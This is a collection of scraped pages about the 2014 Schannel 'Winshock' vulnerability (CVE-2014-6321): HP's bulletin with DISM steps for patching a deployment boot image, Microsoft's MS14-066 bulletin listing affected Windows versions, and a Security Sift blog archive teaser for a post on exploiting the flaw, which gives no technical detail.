Connect with me...
[![]( https://www.securitysift.com/wp-content/themes/news-leak/images/rss.png)](http://www.securitysift.com/?feed=rss) [![]( https://www.securitysift.com/wp-content/themes/news-leak/images/in.png)](www.linkedin.com/in/michaelczumak%20) [![]( https://www.securitysift.com/wp-content/themes/news-leak/images/tweeter.png)](https://twitter.com/SecuritySift) [![]( https://www.securitysift.com/wp-content/themes/news-leak/images/face.png)](https://www.facebook.com/secsift)

* Most Popular Posts
* Random Posts

* [Offensive Security’s PWB and OSCP — My Experience](https://www.securitysift.com/offsec-pwb-oscp/ "Offensive Security’s PWB and OSCP — My Experience")October 9, 2013
* [Exploiting MS14-066 / CVE-2014-6321 (aka “Winshock”)](https://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/ "Exploiting MS14-066 / CVE-2014-6321 (aka “Winshock”)")November 29, 2014
* [Windows Exploit Development – Part 2: Intro to Stack Based Overflows](https://www.securitysift.com/windows-exploit-development-part-2-intro-stack-overflow/ "Windows Exploit Development – Part 2: Intro to Stack Based Overflows")December 13, 2013
* [peCloak.py – An Experiment in AV Evasion](https://www.securitysift.com/pecloak-py-an-experiment-in-av-evasion/ "peCloak.py – An Experiment in AV Evasion")March 9, 2015
* [Phishing with Macros and Powershell](https://www.securitysift.com/phishing-with-macros-and-powershell/ "Phishing with Macros and Powershell")May 22, 2015

* [Developing a Security Assessment Program](https://www.securitysift.com/developing-a-security-assessment-program/)December 19, 2014
* [Windows Exploit Development – Part 1: The Basics](https://www.securitysift.com/windows-exploit-development-part-1-basics/)December 6, 2013
* [Understanding WordPress Auth Cookies](https://www.securitysift.com/understanding-wordpress-auth-cookies/)April 20, 2014
* [The Search For Shellshock](https://www.securitysift.com/the-search-for-shellshock/)September 28, 2014
* [Phishing with Macros and Powershell](https://www.securitysift.com/phishing-with-macros-and-powershell/)May 22, 2015

### Categories

* [Breaches](https://www.securitysift.com/category/breaches/)
* [Exploits](https://www.securitysift.com/category/exploits/)
* [Opinion](https://www.securitysift.com/category/opinion/)
* [Pentesting](https://www.securitysift.com/category/pentesting/)
* [Puzzles](https://www.securitysift.com/category/puzzles/)
* [Training/Certifications](https://www.securitysift.com/category/trainingcertifications/)
* [Uncategorized](https://www.securitysift.com/category/uncategorized/)
* [Web Security](https://www.securitysift.com/category/web-security/)

### Archives

* [October 2017](https://www.securitysift.com/2017/10/)
* [September 2017](https://www.securitysift.com/2017/09/)
* [May 2015](https://www.securitysift.com/2015/05/)
* [April 2015](https://www.securitysift.com/2015/04/)
* [March 2015](https://www.securitysift.com/2015/03/)
* [February 2015](https://www.securitysift.com/2015/02/)
* [December 2014](https://www.securitysift.com/2014/12/)
* [November 2014](https://www.securitysift.com/2014/11/)
* [October 2014](https://www.securitysift.com/2014/10/)
* [September 2014](https://www.securitysift.com/2014/09/)
* [July 2014](https://www.securitysift.com/2014/07/)
* [May 2014](https://www.securitysift.com/2014/05/)

### Pages

* [About](https://www.securitysift.com/about/)
* [My Library](https://www.securitysift.com/my-library/)
### Follow me on Twitter

[My Tweets](https://twitter.com/422832532212559872)

The views and and opinions expressed in this blog are my own and do not represent those of my previous or current employer. © Copyright 2025 Security Sift. All Rights Reserved,

---



=== Content from marc.info_5c387bf2_20250124_115545.html ===

```
[[prev in list](?l=bugtraq&m=142382677725286&w=2)] [[next in list](?l=bugtraq&m=142384821100801&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [security bulletin] HPSBGN03258 rev.1 - HP Insight Control server deployment Windows Pre-boot Execut
From:       [security-alert () hp ! com](?a=90366096700007&r=1&w=2)
Date:       [2015-02-13 15:46:52](?l=bugtraq&r=1&w=2&b=201502)
Message-ID: [20150213154652.152B1209EE () security ! hp ! com](?i=20150213154652.152B1209EE%20()%20security%20!%20hp%20!%20com)
[Download RAW [message](?l=bugtraq&m=142384364031268&q=mbox) or [body](?l=bugtraq&m=142384364031268&q=raw)]

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Note: the current version of the following document is available here:
<https://h20564.www2.hp.com/portal/site/hpsc/public/kb/>
docDisplay?docId=emr_na-c04568731

SUPPORT COMMUNICATION - SECURITY BULLETIN

Document ID: c04568731
Version: 1

HPSBGN03258 rev.1 - HP Insight Control server deployment Windows Pre-boot
Execution Environment, Microsoft Schannel (Winshock) Remote Code Execution

NOTICE: The information in this Security Bulletin should be acted upon as
soon as possible.

Release Date: 2015-02-12
Last Updated: 2015-02-12

Potential Security Impact: Multiple vulnerabilities

Source: Hewlett-Packard Company, HP Software Security Response Team

VULNERABILITY SUMMARY
A potential security vulnerability has been identified with HP Insight
Control server deployment Windows Pre-boot Execution Environment that could
be exploited remotely resulting in arbitrary execution of code. This is the
vulnerability known as Winshock.

HP Insight Control server deployment uses the Windows Automated Installation
Kit 2.0 to generate the Windows Pre-boot Execution Environment service
operating system. WAIK 2.0 is vulnerable to CVE-2014-6321 (Microsoft Schannel
Remote Code Execution vulnerability). This bulletin provides instructions to
update the Windows Pre-boot Execution Environment with updates from
Microsoft.

References:

CVE-2014-6321
SSRT101856

SUPPORTED SOFTWARE VERSIONS*: ONLY impacted versions are listed.
HP Insight Control server deployment version 7.3.2 and earlier

BACKGROUND

CVSS 2.0 Base Metrics
===========================================================
  Reference              Base Vector             Base Score
CVE-2014-6321    (AV:N/AC:L/Au:N/C:C/I:C/A:C)       10.0
===========================================================
             Information on CVSS is documented
            in HP Customer Notice: HPSN-2008-002

RESOLUTION

HP has provided the following instructions to resolve this vulnerability.

Follow these steps to update the Microsoft Schannel HP Insight Control server
deployment Windows Pre-boot Execution Environment:

Download the patch for Windows Server 2008 R2 for x64-based Systems Service
Pack 1 from the following location:
<http://www.microsoft.com/en-us/download/details.aspx?id=44618>

Instructions to modify a Windows image using DISM can be found here:
<https://technet.microsoft.com/en-in/library/hh824814.aspx>

The following examples use the typical Insight Control server deployment
folder structure to update files in Windows Imaging File Format in Insight
Control server deployment server:

NOTE: The patches must be installed in the following order: KB3018238,
KB2992611

Mount an image:
c:\Program Files (x86)\Altiris\eXpress\Deployment
Server\WAIK\tools\PETools\amd64>Dism /Mount-wim /wimfile:"c:\Program Files
(x86)\Altiris\eXpress\Deployment Server\WAIK\tools\PETools\amd64\winpe.wim"
/index:1 /MountDir:C:\test\offline

NOTE:

C:\test\offline - Temp directory used to mount and update wim file
C:\Program Files (x86)\Altiris\eXpress\Deployment Server\ - Directory where
Insight Control server deployment is Installed.

Add updated package
c:\Program Files (x86)\Altiris\eXpress\Deployment
Server\WAIK\tools\PETools\amd64>dism /image:c:\test\offline /add-package
/PackagePath:"C:\program files"\Windows6.1-KB3018238-x64.msu
/packagepath:"c:\Program Files"\Windows6.1-KB2992611-x64.msu
Unmount an image
c:\Program Files (x86)\Altiris\eXpress\Deployment
Server\WAIK\tools\PETools\amd64>dism /unmount-wim /mountdir:c:\test\offline
/commit
Regenerate Boot Images (WinPE) using PXE Configuration Utility
a. Open the PXE Configuration Utility on the HP Insight Control server
deployment window

b. Check the WinPE option available under Regenerate Boot Images and click on
Regenerate

c. Click on Save and Ok option once regeneration is done.

HISTORY
Version:1 (rev.1) - 12 February 2015 Initial release

Third Party Security Patches: Third party security patches that are to be
installed on systems running HP software products should be applied in
accordance with the customer's patch management policy.

Support: For issues about implementing the recommendations of this Security
Bulletin, contact normal HP Services support channel.  For other issues about
the content of this Security Bulletin, send e-mail to security-alert@hp.com.

Report: To report a potential security vulnerability with any HP supported
product, send Email to: security-alert@hp.com

Subscribe: To initiate a subscription to receive future HP Security Bulletin
alerts via Email:
<http://h41183.www4.hp.com/signup_alerts.php?jumpid=hpsc_secbulletins>

Security Bulletin Archive: A list of recently released Security Bulletins is
available here:
<https://h20564.www2.hp.com/portal/site/hpsc/public/kb/secBullArchive/>

Software Product Category: The Software Product Category is represented in
the title by the two characters following HPSB.

3C = 3COM
3P = 3rd Party Software
GN = HP General Software
HF = HP Hardware and Firmware
MP = MPE/iX
MU = Multi-Platform Software
NS = NonStop Servers
OV = OpenVMS
PI = Printing and Imaging
PV = ProCurve
ST = Storage Software
TU = Tru64 UNIX
UX = HP-UX

Copyright 2015 Hewlett-Packard Development Company, L.P.
Hewlett-Packard Company shall not be liable for technical or editorial errors
or omissions contained herein. The information provided is provided "as is"
without warranty of any kind. To the extent permitted by law, neither HP or
its affiliates, subcontractors or suppliers will be liable for
incidental,special or consequential damages including downtime cost; lost
profits; damages relating to the procurement of substitute products or
services; or damages for loss of data, or software restoration. The
information in this document is subject to change without notice.
Hewlett-Packard Company and the names of Hewlett-Packard products referenced
herein are trademarks of Hewlett-Packard Company in the United States and
other countries. Other product and company names mentioned herein may be
trademarks of their respective owners.

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.13 (GNU/Linux)

iEYEARECAAYFAlTc/1MACgkQ4B86/C0qfVkS1ACfUxFa2XwaopmAFJFhnp58/LDt
qgQAnjQZLKJUuUUMdKxAztw0Vb5Qxhgs
=mELm
-----END PGP SIGNATURE-----
[[prev in list](?l=bugtraq&m=142382677725286&w=2)] [[next in list](?l=bugtraq&m=142384821100801&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from docs.microsoft.com_2fd2758e_20250124_115549.html ===

[Skip to main content](#main)

This browser is no longer supported.

Upgrade to Microsoft Edge to take advantage of the latest features, security updates, and technical support.

[Download Microsoft Edge](https://go.microsoft.com/fwlink/p/?LinkID=2092881 )
[More info about Internet Explorer and Microsoft Edge](https://learn.microsoft.com/en-us/lifecycle/faq/internet-explorer-microsoft-edge)

Table of contents

Exit focus mode

Read in English

Save

Table of contentsRead in English

Save

Add to plan
[Edit](https://github.com/MicrosoftDocs/security-updates/blob/live/security-updates/SecurityBulletins/2014/ms14-066.md "Edit This Document")

---

#### Share via

Facebook
x.com
LinkedIn
Email

---

Print

Table of contents

# Microsoft Security Bulletin MS14-066 - Critical

* Article
* 03/01/2023
* 5 contributors

Feedback

## In this article

## Vulnerability in Schannel Could Allow Remote Code Execution (2992611)

Published: November 11, 2014 | Updated: December 9, 2014

**Version:** 3.0

## Executive Summary

This security update resolves a privately reported vulnerability in the [Microsoft Secure Channel (Schannel)](https://technet.microsoft.com/library/security/dn848375.aspx) security package in Windows. The vulnerability could allow remote code execution if an attacker sends specially crafted packets to a Windows server.

This security update is rated Critical for all supported releases of Microsoft Windows. For more information, see the **Affected Software** section.

The security update addresses the vulnerability by correcting how Schannel sanitizes specially crafted packets. For more information about the vulnerability, see the **Frequently Asked Questions (FAQ)** subsection for the specific vulnerability.

For more information about this update, see [Microsoft Knowledge Base Article 2992611](https://support.microsoft.com/kb/2992611).

## Affected Software

The following software has been tested to determine which versions or editions are affected. Other versions or editions are either past their support life cycle or are not affected. To determine the support life cycle for your software version or edition, see [Microsoft Support Lifecycle](https://go.microsoft.com/fwlink/?linkid=21742).

**Affected Software**

| **Operating System** | **Maximum Security Impact** | **Aggregate Severity Rating** | **Updates Replaced** |
| --- | --- | --- | --- |
| **Windows Server 2003** |  |  |  |
| [Windows Server 2003 Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=c8e2526e-bb30-4faf-a550-ad26fef05ccd) (2992611) | Remote Code Execution | Critical | 2655992 in [MS12-049](https://go.microsoft.com/fwlink/?linkid=251035) |
| [Windows Server 2003 x64 Edition Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=e1952d2f-df0c-40d0-ab55-28652933e993) (2992611) | Remote Code Execution | Critical | 2655992 in [MS12-049](https://go.microsoft.com/fwlink/?linkid=251035) |
| [Windows Server 2003 with SP2 for Itanium-based Systems](https://www.microsoft.com/download/details.aspx?familyid=ae98e940-dfde-407d-8e8f-b76a5f974219) (2992611) | Remote Code Execution | Critical | 2655992 in [MS12-049](https://go.microsoft.com/fwlink/?linkid=251035) |
| **Windows Vista** |  |  |  |
| [Windows Vista Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=45413577-6bb8-4d14-b4e6-76ac56cdd8f4) (2992611) | Remote Code Execution | Critical | 2207566 in [MS10-085](https://go.microsoft.com/fwlink/?linkid=201705) |
| [Windows Vista x64 Edition Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=b949cc3e-ae99-4c8a-ac4d-4847cde7b12f) (2992611) | Remote Code Execution | Critical | 2207566 in [MS10-085](https://go.microsoft.com/fwlink/?linkid=201705) |
| **Windows Server 2008** |  |  |  |
| [Windows Server 2008 for 32-bit Systems Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=c05680a1-3bb2-43d3-b594-659563ac4d31) (2992611) | Remote Code Execution | Critical | 2207566 in [MS10-085](https://go.microsoft.com/fwlink/?linkid=201705) |
| [Windows Server 2008 for x64-based Systems Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=75f8eabe-d39a-41f0-9920-1394dda353e7) (2992611) | Remote Code Execution | Critical | 2207566 in [MS10-085](https://go.microsoft.com/fwlink/?linkid=201705) |
| [Windows Server 2008 for Itanium-based Systems Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=220138ff-7217-400a-8b12-2e22f08e31ea) (2992611) | Remote Code Execution | Critical | 2207566 in [MS10-085](https://go.microsoft.com/fwlink/?linkid=201705) |
| **Windows 7** |  |  |  |
| [Windows 7 for 32-bit Systems Service Pack 1](https://www.microsoft.com/download/details.aspx?familyid=499f0744-5644-43b5-b80e-2b83e5a3b44d) (2992611) | Remote Code Execution | Critical | 2868725 in [SA2868725](https://technet.microsoft.com/library/2868725.aspx) |
| [Windows 7 for x64-based Systems Service Pack 1](https://www.microsoft.com/download/details.aspx?familyid=77338ee3-95b3-4bab-bef9-7fb6c8d05f5e) (2992611) | Remote Code Execution | Critical | 2868725 in [SA2868725](https://technet.microsoft.com/library/2868725.aspx) |
| **Windows Server 2008 R2** |  |  |  |
| [Windows Server 2008 R2 for x64-based Systems Service Pack 1](https://www.microsoft.com/download/details.aspx?familyid=cc534b2e-e5f3-41d2-865b-c25cd3227f78) (2992611) | Remote Code Execution | Critical | 2868725 in [SA2868725](https://technet.microsoft.com/library/2868725.aspx) |
| [Windows Server 2008 R2 for Itanium-based Systems Service Pack 1](https://www.microsoft.com/download/details.aspx?familyid=790a26d0-33cc-48b3-9f00-996af83fbb7c) (2992611) | Remote Code Execution | Critical | 2868725 in [SA2868725](https://technet.microsoft.com/library/2868725.aspx) |
| **Windows 8 and Windows 8.1** |  |  |  |
| [Windows 8 for 32-bit Systems](https://www.microsoft.com/download/details.aspx?familyid=418bd2ad-9ed8-47aa-ad87-d94550542072) (2992611) | Remote Code Execution | Critical | 2868725 in [SA2868725](https://technet.microsoft.com/library/2868725.aspx) |
| [Windows 8 for x64-based Systems](https://www.microsoft.com/download/details.aspx?familyid=712fe4ca-76a7-4bbd-8dd4-be4d30762548) (2992611) | Remote Code Execution | Critical | 2868725 in [SA2868725](https://technet.microsoft.com/library/2868725.aspx) |
| [Windows 8.1 for 32-bit Systems](https://www.microsoft.com/download/details.aspx?familyid=902d6e33-843a-42b5-a466-bcde3d29cb0c) (2992611) | Remote Code Execution | Critical | None |
| [Windows 8.1 for x64-based Systems](https://www.microsoft.com/download/details.aspx?familyid=dd430a3c-649d-4724-9b86-af8a5eba1925) (2992611) | Remote Code Execution | Critical | None |
| **Windows Server 2012 and Windows Server 2012 R2** |  |  |  |
| [Windows Server 2012](https://www.microsoft.com/download/details.aspx?familyid=aa355f7b-7316-415b-8fa9-b711c040594d) (2992611) | Remote Code Execution | Critical | 2868725 in [SA2868725](https://technet.microsoft.com/library/2868725.aspx) |
| [Windows Server 2012 R2](https://www.microsoft.com/download/details.aspx?familyid=bbaac95a-a997-41e1-b5ea-4687b48efe9c) (2992611) | Remote Code Execution | Critical | None |
| **Windows RT and Windows RT 8.1** |  |  |  |
| Windows RT[1](2992611) | Remote Code Execution | Critical | 2868725 in [SA2868725](https://technet.microsoft.com/library/2868725.aspx) |
| Windows RT 8.1[1](2992611) | Remote Code Execution | Critical | None |
| **Server Core installation option** |  |  |  |
| [Windows Server 2008 for 32-bit Systems Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=c05680a1-3bb2-43d3-b594-659563ac4d31) (Server Core installation) (2992611) | Remote Code Execution | Critical | 2207566 in [MS10-085](https://go.microsoft.com/fwlink/?linkid=201705) |
| [Windows Server 2008 for x64-based Systems Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=75f8eabe-d39a-41f0-9920-1394dda353e7) (Server Core installation) (2992611) | Remote Code Execution | Critical | 2207566 in [MS10-085](https://go.microsoft.com/fwlink/?linkid=201705) |
| [Windows Server 2008 R2 for x64-based Systems Service Pack 1](https://www.microsoft.com/download/details.aspx?familyid=cc534b2e-e5f3-41d2-865b-c25cd3227f78) (Server Core installation) (2992611) | Remote Code Execution | Critical | 2868725 in [SA2868725](https://technet.microsoft.com/library/2868725.aspx) |
| [Windows Server 2012](https://www.microsoft.com/download/details.aspx?familyid=aa355f7b-7316-415b-8fa9-b711c040594d) (Server Core installation) (2992611) | Remote Code Execution | Critical | 2868725 in [SA2868725](https://technet.microsoft.com/library/2868725.aspx) |
| [Windows Server 2012 R2](https://www.microsoft.com/download/details.aspx?familyid=bbaac95a-a997-41e1-b5ea-4687b48efe9c) (Server Core installation) (2992611) | Remote Code Execution | Critical | None |

[1]This update is available via [Windows Update](https://go.microsoft.com/fwlink/?linkid=21130) only.

## Update FAQ

**Does this update contain any additional security-related changes to functionality?**

Yes. In addition to the changes that are listed in the Vulnerability Information section of this bulletin, this update includes changes to available TLS cipher suites for Windows 7, Windows Server 2008 R2, Windows 8, and Windows Server 2012 systems. See [Microsoft Knowledge Base Article 2992611](https://support.microsoft.com/kb/2992611) for more information.

## Severity Ratings and Vulnerability Identifiers

The following severity ratings assume the potential maximum impact of the vulnerability. For information regarding the likelihood, within 30 days of this security bulletin's release, of the exploitability of the vulnerability in relation to its severity rating and security impact, please see the Exploitability Index in the [November bulletin summary](https://technet.microsoft.com/library/security/ms14-nov).

| **Vulnerability Severity Rating and Maximum Security Impact by Affected Software** |  |  |
| --- | --- | --- |
| **Affected Software** | [**Microsoft Schannel Remote Code Execution Vulnerability - CVE-2014-6321**](https://www.cve.org/CVERecord?id=CVE-2014-6321) | **Aggregate Severity Rating** |
| **Windows Server 2003** |  |  |
| Windows Server 2003 Service Pack 2 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows Server 2003 x64 Edition Service Pack 2 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows Server 2003 with SP2 for Itanium-based Systems (2992611) | **Critical**  Remote Code Execution | **Critical** |
| **Windows Vista** |  |  |
| Windows Vista Service Pack 2 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows Vista x64 Edition Service Pack 2 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| **Windows Server 2008** |  |  |
| Windows Server 2008 for 32-bit Systems Service Pack 2 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows Server 2008 for x64-based Systems Service Pack 2 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows Server 2008 for Itanium-based Systems Service Pack 2 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| **Windows 7** |  |  |
| Windows 7 for 32-bit Systems Service Pack 1 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows 7 for x64-based Systems Service Pack 1 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| **Windows Server 2008 R2** |  |  |
| Windows Server 2008 R2 for x64-based Systems Service Pack 1 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows Server 2008 R2 for Itanium-based Systems Service Pack 1 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| **Windows 8 and Windows 8.1** |  |  |
| Windows 8 for 32-bit Systems (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows 8 for x64-based Systems (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows 8.1 for 32-bit Systems (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows 8.1 for x64-based Systems (2992611) | **Critical**  Remote Code Execution | **Critical** |
| **Windows Server 2012 and Windows Server 2012 R2** |  |  |
| Windows Server 2012 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows Server 2012 R2 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| **Windows RT and Windows RT 8.1** |  |  |
| Windows RT (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows RT 8.1 (2992611) | **Critical**  Remote Code Execution | **Critical** |
| **Server Core installation option** |  |  |
| Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows Server 2012 (Server Core installation) (2992611) | **Critical**  Remote Code Execution | **Critical** |
| Windows Server 2012 R2 (Server Core installation) (2992611) | **Critical**  Remote Code Execution | **Critical** |

## Microsoft Schannel Remote Code Execution Vulnerability - CVE-2014-6321

A remote code execution vulnerability exists in the [Secure Channel (Schannel)](https://technet.microsoft.com/library/security/dn848375.aspx) security package due to the improper processing of specially crafted packets. Microsoft received information about this vulnerability through coordinated vulnerability disclosure. When this security bulletin was issued, Microsoft had not received any information to indicate that this vulnerability had been publicly used to attack customers. The update addresses the vulnerability by correcting how Schannel sanitizes specially crafted packets.

### Mitigating Factors

Microsoft has not identified any [mitigating factors](https://technet.microsoft.com/library/security/dn848375.aspx) for this vulnerability.

### Workarounds

Microsoft has not identified any [workarounds](https://technet.microsoft.com/library/security/dn848375.aspx) for this vulnerability.

### FAQ

**What might an attacker use the vulnerability to do?**

An attacker who successfully exploited this vulnerability could run arbitrary code on a target server.

**How could an attacker exploit the vulnerability?**

An attacker could attempt to exploit this vulnerability by sending specially crafted packets to a Windows server.

**What systems are primarily at risk from the vulnerability?**

Server and workstation systems that are running an affected version of Schannel are primarily at risk.

## Security Update Deployment

For Security Update Deployment information, see the Microsoft Knowledge Base article referenced in the Executive Summary.

## Acknowledgments

Microsoft recognizes the efforts of those in the security community who help us protect customers through coordinated vulnerability disclosure. See [Acknowledgments](https://technet.microsoft.com/library/security/dn820091.aspx) for more information.

## Disclaimer

The information provided in the Microsoft Knowledge Base is provided "as is" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.

## Revisions

* V1.0 (November 11, 2014): Bulletin published.
* V2.0 (November 18, 2014): Bulletin revised to announce the reoffering of the 2992611 update to systems running Windows Server 2008 R2 and Windows Server 2012. The reoffering addresses known issues that a small number of customers experienced with the new TLS cipher suites that were included in the original release. Customers running Windows Server 2008 R2 or Windows Server 2012 who installed the 2992611 update prior to the November 18 reoffering should reapply the update. See [Microsoft Knowledge Base Article 2992611](https://support.microsoft.com/kb/2992611) for more information.
* V3.0 (December 9, 2014): Bulletin revised to announce the reoffering of the 2992611 update to systems running Windows Vista and Windows Server 2008. The reoffering addresses an issue in the original release. Customers running Windows Vista or Windows Server 2008 who installed the 2992611 update prior to the December 9 reoffering should reapply the update. See [Microsoft Knowledge Base Article 2992611](https://support.microsoft.com/kb/2992611) for more information.

*Page generated 2015-03-31 11:42Z-07:00.*

---

## Additional resources

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025
## Additional resources

### In this article

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025



=== Content from www.securitysift.com_7a22bcad_20250126_005642.html ===


* [Home](https://www.securitysift.com/)
* [About](https://www.securitysift.com/about/)
* [My Library](https://www.securitysift.com/my-library/)

# [Security Sift](https://www.securitysift.com/)

Sifting through the world of Information Security, one bit at a time

Sift: to examine (something) thoroughly so as to isolate that which is most important -- Oxford Dictionary

Google
Current archive: November 29, 2014
## [Exploiting MS14-066 / CVE-2014-6321 (aka “Winshock”)](https://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/ "Exploiting MS14-066 / CVE-2014-6321 (aka “Winshock”)")

Written by:[Mike Czumak](https://www.securitysift.com/author/admin/ "Posts by Mike Czumak")Written on:[November 29, 2014](https://www.securitysift.com/2014/11/29/)
Comments

 [![ms14066_36](https://www.securitysift.com/wp-content/uploads/2014/11/ms14066_36-2-295x180.jpg)](https://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/)

Introduction I think enough time has passed now to provide a little more detail on how to exploit MS14-066 schannel vulnerability (aka “Winshock”). In this post I won’t be providing a complete PoC exploit, but I will delve into the details on exactly how to trigger the heap overflow along with some example modifications to OpenSSL so you can replicate the issue yourself. This vulnerability was announced while I was on…

### Share this:

* [Twitter](https://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/?share=twitter "Click to share on Twitter")
* [Facebook](https://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/?share=facebook "Click to share on Facebook")
* [LinkedIn](https://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/?share=linkedin "Click to share on LinkedIn")
* Email
* [Pinterest](https://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/?share=pinterest "Click to share on Pinterest")
* [Reddit](https://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/?share=reddit "Click to share on Reddit")
[Read more...](https://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/)
In category: [Exploits](https://www.securitysift.com/category/exploits/)

Connect with me...
[![]( https://www.securitysift.com/wp-content/themes/news-leak/images/rss.png)](http://www.securitysift.com/?feed=rss) [![]( https://www.securitysift.com/wp-content/themes/news-leak/images/in.png)](www.linkedin.com/in/michaelczumak%20) [![]( https://www.securitysift.com/wp-content/themes/news-leak/images/tweeter.png)](https://twitter.com/SecuritySift) [![]( https://www.securitysift.com/wp-content/themes/news-leak/images/face.png)](https://www.facebook.com/secsift)

* Most Popular Posts
* Random Posts

* [Offensive Security’s PWB and OSCP — My Experience](https://www.securitysift.com/offsec-pwb-oscp/ "Offensive Security’s PWB and OSCP — My Experience")October 9, 2013
* [Exploiting MS14-066 / CVE-2014-6321 (aka “Winshock”)](https://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/ "Exploiting MS14-066 / CVE-2014-6321 (aka “Winshock”)")November 29, 2014
* [Windows Exploit Development – Part 2: Intro to Stack Based Overflows](https://www.securitysift.com/windows-exploit-development-part-2-intro-stack-overflow/ "Windows Exploit Development – Part 2: Intro to Stack Based Overflows")December 13, 2013
* [peCloak.py – An Experiment in AV Evasion](https://www.securitysift.com/pecloak-py-an-experiment-in-av-evasion/ "peCloak.py – An Experiment in AV Evasion")March 9, 2015
* [Phishing with Macros and Powershell](https://www.securitysift.com/phishing-with-macros-and-powershell/ "Phishing with Macros and Powershell")May 22, 2015

* [Cross Origin Request Forgery – Attacking HTTPS via HTTP MiTM Injection](https://www.securitysift.com/cross-origin-request-forgery-attacking-https-via-http-mitm-injection/)October 1, 2012
* [Solving the 2013 Verizon DBIR Cover Challenge](https://www.securitysift.com/solving-the-2013-verizon-dbir-cover-challenge/)April 30, 2013
* [Shellshock – Targeting Non-CGI PHP](https://www.securitysift.com/shellshock-targeting-non-cgi-php/)September 30, 2014
* [When is Clickjacking NOT a concern?](https://www.securitysift.com/when-is-clickjacking-not-a-concern/)May 30, 2013
* [Passive Reconnaissance](https://www.securitysift.com/passive-reconnaissance/)February 5, 2014

### Categories

* [Breaches](https://www.securitysift.com/category/breaches/)
* [Exploits](https://www.securitysift.com/category/exploits/)
* [Opinion](https://www.securitysift.com/category/opinion/)
* [Pentesting](https://www.securitysift.com/category/pentesting/)
* [Puzzles](https://www.securitysift.com/category/puzzles/)
* [Training/Certifications](https://www.securitysift.com/category/trainingcertifications/)
* [Uncategorized](https://www.securitysift.com/category/uncategorized/)
* [Web Security](https://www.securitysift.com/category/web-security/)

### Archives

* [October 2017](https://www.securitysift.com/2017/10/)
* [September 2017](https://www.securitysift.com/2017/09/)
* [May 2015](https://www.securitysift.com/2015/05/)
* [April 2015](https://www.securitysift.com/2015/04/)
* [March 2015](https://www.securitysift.com/2015/03/)
* [February 2015](https://www.securitysift.com/2015/02/)
* [December 2014](https://www.securitysift.com/2014/12/)
* [November 2014](https://www.securitysift.com/2014/11/)
* [October 2014](https://www.securitysift.com/2014/10/)
